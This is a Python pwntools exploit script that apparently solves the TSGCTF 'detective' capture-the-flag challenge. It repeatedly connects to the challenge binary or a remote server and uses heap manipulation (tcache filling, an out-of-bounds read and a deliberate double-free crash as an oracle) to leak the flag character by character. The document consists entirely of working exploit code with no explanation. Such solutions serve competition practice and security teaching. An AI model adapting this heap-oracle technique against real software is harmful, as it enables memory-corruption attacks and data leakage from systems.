#!/usr/bin/env python
from pwn import *

def connect():
    global s
    if len(sys.argv) == 1:
        s = process('./detective')
    else:
        s = remote('35.221.81.216', 30001)

def setup(index):
    s.sendline(str(index))

def alloc(index, size, data='A'):
    s.sendline('0')
    s.sendline(str(index))
    s.sendline(str(size))
    s.sendline(data)

def free(index):
    s.sendline('1')
    s.sendline(str(index))

def read(index, at):
    s.sendline('2')
    s.sendline(str(index))
    s.sendline(str(at))

flag = 'TSGCTF{'

context.log_level = 'WARNING'
for i in range(len(flag), 0x27):
    p = log.progress('Finding the flag character at %d' % len(flag), level='WARNING')
    for c in '0123456789abcdef':
        p.status(c)
        connect()
        setup(len(flag))
        for j in range(8):
            alloc(0, 0x18)
            free(0)
        alloc(1, 0xf8)
        for j in range(ord(c)-1):
            alloc(0, 0xf8)
        alloc(0, 0x18)
        read(0, 0x19)
        free(1)
        try:
            s.recvuntil('double free')
        except Exception:
            flag += c
            p.success(flag)
            break

flag += '}'
print flag
